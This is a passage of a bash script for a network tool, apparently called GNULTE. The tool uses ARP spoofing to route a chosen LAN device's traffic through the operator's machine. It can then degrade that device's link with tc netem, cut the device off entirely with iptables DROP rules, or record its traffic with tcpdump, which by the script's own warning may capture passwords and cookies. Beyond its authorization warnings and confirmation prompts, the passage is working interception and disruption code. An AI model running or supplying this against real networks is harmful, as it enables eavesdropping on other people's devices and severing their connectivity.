# Explicit pre-flight: show exactly what is about to happen and require a
# deliberate go/no-go. Answered "No" must stop the program before anything
# touches the network.
safety_summary() {
    local T
    echo ""
    echo -e "${COLOR_ERR}════════════════════════════════════════════════════════════════${COLOR_RESET}"
    echo -e "${COLOR_BOLD}                        CONFIRM TEST${COLOR_RESET}"
    echo -e "${COLOR_ERR}════════════════════════════════════════════════════════════════${COLOR_RESET}"
    echo -e "  ${COLOR_BOLD}TARGET(S):${COLOR_RESET}"
    for T in "${TARGETS[@]}"; do
        echo "      $T"
    done
    echo ""
    echo -e "  ${COLOR_BOLD}NETWORK-IMPACTING OPERATIONS:${COLOR_RESET}"
    echo "      • ARP-based MITM routing (arpspoof)"
    if [ "$BLOCK_MODE" = true ]; then
        echo -e "      • ${COLOR_ERR}100% BLOCK — packets are NOT forwarded${COLOR_RESET}"
        echo -e "        ${COLOR_ERR}(target connectivity fully severed + FORWARD-chain DROP rules)${COLOR_RESET}"
    else
        echo "      • Traffic shaping / impairment (tc netem)"
    fi
    if [ -n "$CAPTURE_FILE" ]; then
        echo "      • Packet capture → $CAPTURE_FILE"
        echo "        (UNENCRYPTED data the target sends may be stored — treat it as a secret)"
    fi
    echo ""
    if [ "$BLOCK_MODE" = true ]; then
        echo -e "  ${COLOR_BOLD}MODE:${COLOR_RESET} 100% block — no shaping parameters apply."
    else
        echo -e "  ${COLOR_BOLD}IMPAIRMENT:${COLOR_RESET} Latency ${LATENCY}ms / Jitter ${JITTER}ms / Loss ${LOSS}% / Duplicate ${DUPLICATE}% / Reorder ${REORDER}% / Bandwidth ${BANDWIDTH} kbps"
        echo -e "      ${COLOR_DIM}(bandwidth 0 = unlimited)${COLOR_RESET}"
    fi
    echo ""
    echo -e "  ${COLOR_BOLD}WARNING:${COLOR_RESET} this can disrupt the target's connectivity and sees its traffic."
    echo -e "  ${COLOR_DIM}Proceed only where you are authorized to test these systems, and only"
    echo -e "  where the activity is lawful.${COLOR_RESET}"
    echo ""
}

execute() {
    log_section "EXECUTING"

    # The operations below require root. GNULTE elevates each one via sudo;
    # you may be asked for your sudo password here.
    echo -e "${COLOR_INFO}◆ The next operations require elevated (root) privileges via sudo.${COLOR_RESET}"
    echo ""

    # -- Step 1: packet flow (forward mode routes through us; block mode stops it) --
    ORIG_IP_FORWARD=$(sysctl -n net.ipv4.ip_forward 2>/dev/null || echo 0)
    if [ "$BLOCK_MODE" = true ]; then
        log_section "100% BLOCK MODE"
        echo -e "${COLOR_ERR}  The target's connectivity will be fully severed: ARP spoofing"
        echo -e "  redirects its traffic here and this computer will NOT forward it.${COLOR_RESET}"
        echo ""
        # Force forwarding OFF so nothing can slip through, restore later.
        if [ "$ORIG_IP_FORWARD" != "0" ]; then
            log_cmd "sysctl -w net.ipv4.ip_forward=0"
            sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1
            IP_FORWARD_CHANGED=true; STATE_DIRTY=true
            log_ok "IP forwarding disabled (block mode)"
        else
            log_ok "IP forwarding already off — blocking is absolute"
        fi
    elif expert_confirm "Enable IP forwarding (route the target's traffic through this computer)" \
        "sudo sysctl -w net.ipv4.ip_forward=1"; then
        say "Step 1 — turning on routing so the chosen device's data flows through this computer…"
        log_cmd "sysctl -w net.ipv4.ip_forward=1"
        if sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1; then
            log_ok "IP forwarding enabled"
            if [ "$(sysctl -n net.ipv4.ip_forward 2>/dev/null || echo 0)" = "1" ]; then
                IP_FORWARD_CHANGED=true; STATE_DIRTY=true
            fi
        else
            log_err "Could not enable IP forwarding."
            exit 1
        fi
    else
        log_warn "Skipped IP forwarding by user."
    fi

    # Block/forward modes both install absolute netfilter DROPs in the FORWARD
    # chain so no target packet can ever pass this router, even fleetingly.
    if [ "$BLOCK_MODE" = true ]; then
        local BT
        for BT in "${TARGETS[@]}"; do
            if [ -n "$TARGET_RANGE" ] && [ "$BT" = "$TARGET_RANGE" ]; then continue; fi
            log_cmd "iptables -I FORWARD -d $BT -j DROP ; iptables -I FORWARD -s $BT -j DROP"
            sudo iptables -I FORWARD -d "$BT" -j DROP 2>/dev/null && IPTABLES_DROPS+=("-d $BT -j DROP")
            sudo iptables -I FORWARD -s "$BT" -j DROP 2>/dev/null && IPTABLES_DROPS+=("-s $BT -j DROP")
        done
        [ ${#IPTABLES_DROPS[@]} -gt 0 ] && STATE_DIRTY=true && log_ok "FORWARD chain blocks installed for ${TARGETS[*]}"
    fi

    # -- Step 1b: optional packet capture (with overwrite guard + warning) --
    if [ -n "$CAPTURE_FILE" ]; then
        if [ "$CAPTURE_FILE" != "-" ] && [ -e "$CAPTURE_FILE" ]; then
            read -p "Capture file $CAPTURE_FILE already exists. Overwrite? (y/n) [n]: " OW
            case "${OW:-n}" in
                y|Y) : ;;
                *)   log_warn "Capture disabled (existing file kept)."; CAPTURE_FILE="" ;;
            esac
        fi
    fi
    if [ -n "$CAPTURE_FILE" ]; then
        log_warn "Sensitive-data notice: the capture stores EVERYTHING the selected device sends"
        log_warn "unencrypted (passwords, cookies, media). Protect $CAPTURE_FILE like a secret."
        local -a CAP_EXPR=()
        local capi
        for capi in "${TARGETS[@]}"; do
            CAP_EXPR+=(host "$capi")
        done
        log_cmd "tcpdump -i $INTERFACE ${CAP_EXPR[*]} -w $CAPTURE_FILE"
        say "Recording each target's traffic to $CAPTURE_FILE while the test runs…"
        ( sudo tcpdump -i "$INTERFACE" "${CAP_EXPR[@]}" -w "$CAPTURE_FILE" >/dev/null 2>&1 ) &
        CAPTURE_PID=$!
        sleep 1
        if [ "$CAPTURE_FILE" != "-" ] && ! sudo kill -0 "$CAPTURE_PID" 2>/dev/null; then
            log_err "tcpdump failed to start (wrong interface or permission). Capture disabled."
            CAPTURE_PID=""
        else
            STATE_DIRTY=true
            log_ok "Capturing target traffic -> $CAPTURE_FILE"
        fi
    fi

    if ! command -v arpspoof &>/dev/null; then
        log_err "arpspoof not found. Install with: sudo apt install dsniff"
        exit 1
    fi

    # -- Step 2: ARP spoofing (whole loop gated on the confirmation) --
    say "Step 2 — making each target device believe this computer is its router…"
    if expert_confirm "Start ARP spoofing (redirect each target's traffic to this computer)" \
        "sudo arpspoof -i $INTERFACE -t <TARGET> $GATEWAY"; then
        local TARGET_IP
        for TARGET_IP in "${TARGETS[@]}"; do
            say "Redirecting $TARGET_IP's connection through this computer…"
            log_info "Starting attack on $TARGET_IP..."

            log_cmd "arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY"
            SPOOF1_PIDS+=("$(spoof_launch "$INTERFACE" "$TARGET_IP" "$GATEWAY")")
            sleep 1
            if ! alive_spoof "${SPOOF1_PIDS[-1]}"; then
                log_err "arpspoof failed to start for $TARGET_IP (check interface/route + root)."
                exit 1
            fi
            STATE_DIRTY=true
            log_ok "Spoof $TARGET_IP -> $GATEWAY (PID ${SPOOF1_PIDS[-1]})"

            log_cmd "arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP"
            SPOOF2_PIDS+=("$(spoof_launch "$INTERFACE" "$GATEWAY" "$TARGET_IP")")
            sleep 1
            if ! alive_spoof "${SPOOF2_PIDS[-1]}"; then
                log_err "arpspoof failed to start for $GATEWAY side (check interface/route + root)."
                exit 1
            fi
            STATE_DIRTY=true
            log_ok "Spoof $GATEWAY -> $TARGET_IP (PID ${SPOOF2_PIDS[-1]})"
        done
        echo ""
        animated_bar 2 "Waiting for ARP tables to update..."
    else
        log_warn "Skipped spoofing by user — shaping will only affect direct traffic to/from targets."
    fi

    # -- Step 3: target-specific traffic shaping (skipped in block mode) --
    if [ "$BLOCK_MODE" = true ]; then
        log_warn "Block mode active — the link is fully severed, so traffic shaping is skipped."
    else
    local -a NETEM_ARGS=()
    NETEM_ARGS=(delay "${LATENCY}ms" "${JITTER}ms")
    [ "$LOSS" -gt 0 ] && NETEM_ARGS+=(loss "${LOSS}%")
    [ "$DUPLICATE" -gt 0 ] && NETEM_ARGS+=(duplicate "${DUPLICATE}%")
    [ "$REORDER" -gt 0 ] && NETEM_ARGS+=(reorder "${REORDER}%" gap 5)

    say "Step 3 — slowing the target's link to: ${LATENCY}ms delay${LOSS:+ / ${LOSS}% loss}${JITTER:+ (jitter ${JITTER}ms)}${BANDWIDTH:+ / ${BANDWIDTH} kbps cap}…"
    if expert_confirm "Apply traffic shaping to ${TARGETS[*]}" \
        "sudo tc qdisc add dev $INTERFACE root handle 1: htb default 999"; then
        # Snapshot the interface's current root qdisc so it can be restored later.
        QDISC_BEFORE=$(tc qdisc show dev "$INTERFACE" 2>/dev/null | head -1)
        if ! apply_tc_chain; then
            log_err "Failed to apply traffic control"
            exit 1
        fi
        QDISCS_APPLIED=true; STATE_DIRTY=true
    else
        log_warn "Skipped traffic control by user."
    fi
    fi
    echo ""
}

# Build the per-target shaping tree:
#   root htb (default bypass class for non-target traffic) + u32 filters that
#   send ONLY the target's src/dst traffic into a netem leaf.
# This leaves everyone else on the interface completely untouched.
apply_tc_chain() {
    local rate="${BANDWIDTH}kbit"
    [ "$BANDWIDTH" -eq 0 ] && rate="1gbit"

    log_info "Applying per-target traffic control (non-target traffic bypasses)..."
    log_cmd "tc qdisc add dev $INTERFACE root handle 1: htb default 999"
    log_cmd "tc class add dev $INTERFACE parent 1: classid 1:999 htb rate 1gbit ceil 1gbit"
    log_cmd "tc class add dev $INTERFACE parent 1: classid 1:10 htb rate ${rate} ceil ${rate}"
    log_cmd "tc qdisc add dev $INTERFACE parent 1:10 handle 10: netem ${NETEM_ARGS[*]}"
    log_cmd "tc filter add dev $INTERFACE parent 1: protocol ip prio 1 u32 match ip dst <TARGET>/32 flowid 1:10 (and ip src)"

    sudo tc qdisc del dev "$INTERFACE" root 2>/dev/null
    sudo tc qdisc add dev "$INTERFACE" root handle 1: htb default 999 2>/dev/null || return 1
    sudo tc class add dev "$INTERFACE" parent 1: classid 1:999 htb rate 1gbit ceil 1gbit 2>/dev/null || return 1
    sudo tc class add dev "$INTERFACE" parent 1: classid 1:10 htb rate "$rate" ceil "$rate" 2>/dev/null || return 1
    sudo tc qdisc add dev "$INTERFACE" parent 1:10 handle 10: netem "${NETEM_ARGS[@]}" 2>/dev/null || return 1

    local TP
    for TP in "${TARGETS[@]}"; do
        sudo tc filter add dev "$INTERFACE" parent 1: protocol ip prio 1 \
            u32 match ip dst "$TP"/32 flowid 1:10 2>/dev/null || return 1
        sudo tc filter add dev "$INTERFACE" parent 1: protocol ip prio 1 \
            u32 match ip src "$TP"/32 flowid 1:10 2>/dev/null || return 1
    done
    return 0
}

# -----------------------------------------------------------------------------
# MULTI-TERMINAL MONITOR (spawns a terminal per target)
# -----------------------------------------------------------------------------
# Static body reused for every monitor window; values flow in via environment,
# so nothing user-supplied is ever interpolated into the spawned shell.
monitor_script() {
    cat <<'SCRIPT'
IP="${IP:?}"
echo "GNULTE Monitor – Target: $IP"
echo "Latency: ${LAT}ms | Jitter: ${JIT}ms | Loss: ${LOSS}%"
[ "${BW:-0}" -gt 0 ] && echo "Bandwidth: ${BW} kbps"
echo "────────────────────────────────────────"
while true; do
    P=$(ping -c 1 -W 1 "$IP" 2>/dev/null | grep 'time=' | awk -F'time=' '{print $2}' | cut -d' ' -f1)
    if [ -n "$P" ]; then
        MS=$(printf '%.0f' "$P")
        echo "[$(date +%H:%M:%S)] ${MS}ms"
    else
        echo "[$(date +%H:%M:%S)] unreachable"
    fi
    sleep 1
done
SCRIPT
}

# Single-quote a string so it can be safely embedded inside another shell -c.
sq() { printf "%s" "${1//\'/\'\\\'\'}"; }

spawn_monitor_terminal() {
    local ip="$1"
    local lat="$2"
    local jit="$3"
    local loss="$4"
    local bw="$5"
    local title; title="$(mon_title "$ip")"

    local script; script="$(monitor_script)"
    local envcmd="IP=${ip} LAT=${lat} JIT=${jit} LOSS=${loss} BW=${bw} bash -c '$(sq "$script")'"

    # Try different terminals
    if command -v gnome-terminal &>/dev/null; then
        env IP="$ip" LAT="$lat" JIT="$jit" LOSS="$loss" BW="$bw" \
            gnome-terminal --title="$title" -- bash -c "$script" &
        TERMINAL_PIDS+=($!)
    elif command -v konsole &>/dev/null; then
        env IP="$ip" LAT="$lat" JIT="$jit" LOSS="$loss" BW="$bw" \
            konsole --title "$title" -e bash -c "$script" &
        TERMINAL_PIDS+=($!)
    elif command -v xterm &>/dev/null; then
        env IP="$ip" LAT="$lat" JIT="$jit" LOSS="$loss" BW="$bw" \
            xterm -title "$title" -e bash -c "$script" &
        TERMINAL_PIDS+=($!)
    elif command -v xfce4-terminal &>/dev/null; then
        env IP="$ip" LAT="$lat" JIT="$jit" LOSS="$loss" BW="$bw" \
            xfce4-terminal --title="$title" -e "bash -c \"$script\"" &
        TERMINAL_PIDS+=($!)
    elif command -v alacritty &>/dev/null; then
        env IP="$ip" LAT="$lat" JIT="$jit" LOSS="$loss" BW="$bw" \
            alacritty --title "$title" -e bash -c "$script" &
        TERMINAL_PIDS+=($!)
    elif command -v kitty &>/dev/null; then
        env IP="$ip" LAT="$lat" JIT="$jit" LOSS="$loss" BW="$bw" \
            kitty --title "$title" bash -c "$script" &
        TERMINAL_PIDS+=($!)
    else
        if command -v tmux &>/dev/null; then
            tmux setenv IP "$ip" \; setenv LAT "$lat" \; setenv JIT "$jit" \; \
                setenv LOSS "$loss" \; setenv BW "$bw" \; \
                new-window -n "$title" "$envcmd"
        else
            log_warn "No terminal emulator found. Falling back to single monitor."
            return 1
        fi
    fi
    return 0
}

# -----------------------------------------------------------------------------
# LIVE DASHBOARD
# -----------------------------------------------------------------------------
DASH_LINES=0

dash_clear() {
    if [ "$DASH_LINES" -gt 0 ]; then
        printf "\033[${DASH_LINES}A\033[J"
    fi
    DASH_LINES=0
}

dash_emit() {
    printf "  %s\n" "$1"
    DASH_LINES=$((DASH_LINES + 1))
}

spark_char() {
    local v=$1
    if   [ "$v" -lt 0 ];    then printf "x"
    elif [ "$v" -le 80 ];   then printf "."
    elif [ "$v" -le 250 ];  then printf "-"
    elif [ "$v" -le 500 ];  then printf "="
    elif [ "$v" -le 1000 ]; then printf "#"
    else                          printf "█"; fi
}

status_dot() {
    local v=$1
    if   [ "$v" -lt 0 ];   then printf "${COLOR_ERR}●${COLOR_RESET}"
    elif [ "$v" -le 300 ]; then printf "${COLOR_OK}●${COLOR_RESET}"
    elif [ "$v" -le 800 ]; then printf "${COLOR_WARN}●${COLOR_RESET}"
    else                         printf "${COLOR_ERR}●${COLOR_RESET}"; fi
}

render_single_dashboard() {
    local ip="${TARGETS[0]}"
    local last="${STAT_LAST[0]}" cnt="${STAT_COUNT[0]}" total="${STAT_TOTAL[0]}"
    local mn="${STAT_MIN[0]}" mx="${STAT_MAX[0]}" drops="${STAT_DROP[0]}"
    local avg=0 loss="0.0" attempts=$((cnt + drops))
    [ "$cnt" -gt 0 ] && avg=$((total / cnt))
    [ "$attempts" -gt 0 ] && loss=$(awk -v d="$drops" -v a="$attempts" 'BEGIN{printf "%.1f", d*100/a}')

    local mn_s="--" mx_s="--" last_str="--"
    [ "$cnt" -gt 0 ] && mn_s="${mn}ms" && mx_s="${mx}ms"
    [ "$last" -ge 0 ] && last_str="${last}ms"
    local state="${COLOR_OK}STABLE${COLOR_RESET}"
    if   [ "$last" -lt 0 ];   then state="${COLOR_ERR}UNREACHABLE${COLOR_RESET}"
    elif [ "$last" -gt 800 ]; then state="${COLOR_ERR}SEVERE${COLOR_RESET}"
    elif [ "$last" -gt 300 ]; then state="${COLOR_WARN}DEGRADED${COLOR_RESET}"; fi

    dash_emit ""
    dash_emit "${COLOR_BOLD}Target: ${COLOR_TARGET}${ip}${COLOR_RESET}    Status: ${state}    Last: ${COLOR_BOLD}${last_str}${COLOR_RESET}"
    dash_emit "${COLOR_DIM}min: ${mn_s}   max: ${mx_s}   avg: ${avg}ms   samples: ${cnt}   loss: ${loss}%${COLOR_RESET}"

    local sp="" start=0 n=${#SPARK_SAMPLES[@]}
    [ "$n" -gt 40 ] && start=$((n - 40))
    for ((k=start; k<n; k++)); do
        sp+="$(spark_char "${SPARK_SAMPLES[$k]}")"
    done
    [ -z "$sp" ] && sp="(awaiting samples...)"
    dash_emit "${COLOR_ANIM}${sp}${COLOR_RESET}"
    dash_emit "${COLOR_DIM}${COLOR_BOLD}[$(date +%H:%M:%S)]${COLOR_RESET}"
}

render_multi_dashboard() {
    dash_emit ""
    dash_emit "${COLOR_BOLD}#   Status   Target            min      max     avg    loss   last${COLOR_RESET}"
    dash_emit "${COLOR_DIM}──────────────────────────────────────────────────────────────────────────${COLOR_RESET}"

    local i ip cnt total mn mx drops last avg attempts loss dot mn_s mx_s last_s
    for i in "${!TARGETS[@]}"; do
        ip="${TARGETS[$i]}"; cnt="${STAT_COUNT[$i]}"; total="${STAT_TOTAL[$i]}"
        mn="${STAT_MIN[$i]}"; mx="${STAT_MAX[$i]}"; drops="${STAT_DROP[$i]}"; last="${STAT_LAST[$i]}"
        avg=0; attempts=$((cnt + drops))
        [ "$cnt" -gt 0 ] && avg=$((total / cnt))
        loss="0.0"; [ "$attempts" -gt 0 ] && loss=$(awk -v d="$drops" -v a="$attempts" 'BEGIN{printf "%.1f", d*100/a}')
        dot=$(status_dot "$last")
        mn_s="--"; mx_s="--"; last_s="--"
        [ "$cnt" -gt 0 ] && mn_s="${mn}ms" && mx_s="${mx}ms"
        [ "$last" -ge 0 ] && last_s="${last}ms"

        printf "  %-3s %s   ${COLOR_TARGET}%-16s${COLOR_RESET} %6s %7s %7s %5s%% %7s\n" \
            "$((i+1))" "$dot" "$ip" "$mn_s" "$mx_s" "${avg}ms" "$loss" "$last_s"
        DASH_LINES=$((DASH_LINES + 1))
    done
    dash_emit ""
}

